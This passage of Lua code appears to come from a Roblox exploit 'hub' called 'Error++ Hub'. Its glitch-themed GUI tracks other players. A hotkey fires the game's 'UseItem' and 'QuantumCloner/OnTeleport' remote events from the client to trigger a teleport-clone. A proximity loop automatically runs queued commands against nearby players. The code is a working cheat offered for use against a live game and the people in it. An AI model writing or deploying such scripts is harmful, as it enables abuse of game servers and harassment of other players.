    playerFrame.MouseLeave:Connect(function()
        glitchTween(playerFrame, {BackgroundColor3 = GLITCH_THEME.PanelBg}, 0.1)
    end)
  
    return playerFrame
end
local function refreshPlayerList()
    for _, child in ipairs(playerListFrame:GetChildren()) do
        if child:IsA("Frame") and child.Name:find("Target_") then
            child:Destroy()
        end
    end
  
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            if not playerCommandPools[player] then
                resetPlayerPool(player)
            end
            createPlayerButton(player)
        end
    end
end
if Players and Players.PlayerAdded then
    Players.PlayerAdded:Connect(refreshPlayerList)
end
if Players and Players.PlayerRemoving then
    Players.PlayerRemoving:Connect(refreshPlayerList)
end
local function toggleProximity()
    proximityEnabled = not proximityEnabled
    if proximityEnabled then
        proximityToggle.Text = "ONLINE"
        proximityToggle.BackgroundColor3 = GLITCH_THEME.GlitchGreen
        statusIndicator.BackgroundColor3 = GLITCH_THEME.GlitchGreen
        statusText.Text = "SYSTEM GLITCHED"
        statusText.TextColor3 = GLITCH_THEME.GlitchGreen
        task.spawn(function()
            showGlitchNotification("PROXIMITY GLITCH ON", GLITCH_THEME.GlitchGreen, 1.5)
        end)
    else
        proximityToggle.Text = "OFFLINE"
        proximityToggle.BackgroundColor3 = GLITCH_THEME.GlitchRed
        statusIndicator.BackgroundColor3 = GLITCH_THEME.GlitchRed
        statusText.Text = "SYSTEM ERROR"
        statusText.TextColor3 = GLITCH_THEME.TextShadow
        task.spawn(function()
            showGlitchNotification("PROXIMITY GLITCH OFF", GLITCH_THEME.GlitchRed, 1.5)
        end)
    end
end
proximityToggle.MouseButton1Click:Connect(toggleProximity)
UserInputService.InputBegan:Connect(function(input, gpe)
    if gpe then return end
    if input.KeyCode == Enum.KeyCode.Z then
        toggleProximity()
    end
end)
proximityToggle.MouseEnter:Connect(function()
    local currentColor = proximityEnabled and GLITCH_THEME.GlitchGreen or GLITCH_THEME.GlitchRed
    glitchTween(proximityToggle, {BackgroundColor3 = Color3.fromRGB(math.random(100,255), math.random(0,100), math.random(0,100))}, 0.1)
end)
proximityToggle.MouseLeave:Connect(function()
    local currentColor = proximityEnabled and GLITCH_THEME.GlitchGreen or GLITCH_THEME.GlitchRed
    glitchTween(proximityToggle, {BackgroundColor3 = currentColor}, 0.1)
end)
task.spawn(function()
    while true do
        for command, label in pairs(cooldownLabels) do
            if isCommandOnCooldown(command) then
                local remaining = math.ceil(getRemainingCooldown(command))
                label.Text = remaining .. "s LEFT"
                label.TextColor3 = GLITCH_THEME.GlitchRed
            else
                label.Text = "READY"
                label.TextColor3 = GLITCH_THEME.GlitchGreen
            end
        end
      
        task.wait(0.5)
    end
end)
local function waitForDescendant(parent, pathArray, timeout)
    local node = parent
    local t0 = os.clock()
    for _, name in ipairs(pathArray) do
        repeat
            local found = node:FindFirstChild(name)
            if found then
                node = found
                break
            end
            task.wait(0.1)
        until timeout and os.clock() - t0 > timeout
        if not node then return nil end
    end
    return node
end
local function getBackpack(plr, timeout)
    local t0 = os.clock()
    repeat
        local bp = plr:FindFirstChildOfClass("Backpack")
        if bp then return bp end
        task.wait(0.1)
    until timeout and os.clock() - t0 > timeout
    return nil
end
local function waitForCharacter(plr, timeout)
    local t0 = os.clock()
    repeat
        if plr.Character then return plr.Character end
        task.wait(0.1)
    until timeout and os.clock() - t0 > timeout
    return nil
end
local function waitForHumanoid(char, timeout)
    local t0 = os.clock()
    repeat
        local hum = char:FindFirstChildOfClass("Humanoid")
        if hum then return hum end
        task.wait(0.1)
    until timeout and os.clock() - t0 > timeout
    return nil
end
local function getRemote(name)
    return waitForDescendant(ReplicatedStorage, {"Packages","Net", name}, 10)
end
local function getTool(plr, toolName, timeout)
    local t0 = os.clock()
    while true do
        local bp = getBackpack(plr, 5); if not bp then return nil end
        local tool = bp:FindFirstChild(toolName)
        if tool then return tool end
        if timeout and os.clock() - t0 > timeout then return nil end
        task.wait(0.1)
    end
end
local function unequipHeldTools(plr)
    local char = waitForCharacter(plr, 5); if not char then return end
    local hum = waitForHumanoid(char, 5); if not hum then return end
    hum:UnequipTools()
    local t0 = os.clock()
    while char:FindFirstChildOfClass("Tool") do
        if os.clock() - t0 > 2 then break end
        task.wait()
    end
end
local QC_DELAY_BETWEEN = 0.05
local function activateQuantumCloner()
    unequipHeldTools(LocalPlayer)
    local tool = getTool(LocalPlayer, "Quantum Cloner", 10)
    if not tool then
        task.spawn(function()
            showGlitchNotification("QUANTUM TOOL ERROR!", GLITCH_THEME.GlitchRed, 2)
        end)
        return
    end
    tool.Parent = LocalPlayer.Character
    local UseItem = getRemote("RE/UseItem")
    if not UseItem then
        task.spawn(function()
            showGlitchNotification("USE REMOTE ERROR!", GLITCH_THEME.GlitchRed, 2)
        end)
        return
    end
    UseItem:FireServer()
    task.wait(QC_DELAY_BETWEEN)
    local Tele = getRemote("RE/QuantumCloner/OnTeleport")
    if not Tele then
        task.spawn(function()
            showGlitchNotification("TELE REMOTE ERROR!", GLITCH_THEME.GlitchRed, 2)
        end)
        return
    end
    Tele:FireServer()
    task.spawn(function()
        showGlitchNotification("QUANTUM CLONER EXECUTED!", GLITCH_THEME.GlitchGreen, 1.5)
    end)
end
local qcDebounce = false
UserInputService.InputBegan:Connect(function(input, gpe)
    if gpe then return end
    if input.KeyCode == Enum.KeyCode.V and not qcDebounce then
        qcDebounce = true
        task.spawn(function()
            local ok, err = pcall(activateQuantumCloner)
            if not ok then
                task.spawn(function()
                    showGlitchNotification("QC ERROR: " .. tostring(err), GLITCH_THEME.GlitchRed, 2)
                end)
            end
            task.wait(0.3)
            qcDebounce = false
        end)
    end
end)
RunService.Heartbeat:Connect(function()
    if not proximityEnabled then return end
    local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    local myPos = hrp.Position
  
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
            if (plr.Character.HumanoidRootPart.Position - myPos).Magnitude <= proximityRange then
                if (not lastHit[plr]) or (tick() - lastHit[plr]) >= 1.2 then
                    local pool = playerCommandPools[plr]
                    if pool and #pool > 0 and globalCommandsLeft > 0 then
                        local cmd = table.remove(pool, 1)
                        executeCommand(plr, cmd, "proximity")
                        lastHit[plr] = tick()
                    end
                end
            end
        end
    end
end)
local function makeDraggable(frame)
    local dragging, dragStart, startPos
  
    frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = input.Position
            startPos = frame.Position
          
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)
  
    UserInputService.InputChanged:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = input.Position - dragStart
            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
end
makeDraggable(glitchProximityPanel)
makeDraggable(glitchErrorPanel)
makeDraggable(glitchCooldownPanel)
refreshPlayerList()
task.spawn(function()
    task.wait(1)
    showGlitchNotification("ERROR++ HUB LOADED!", GLITCH_THEME.GlitchBlue, 3)
end)
print("Error++ Hub Loaded")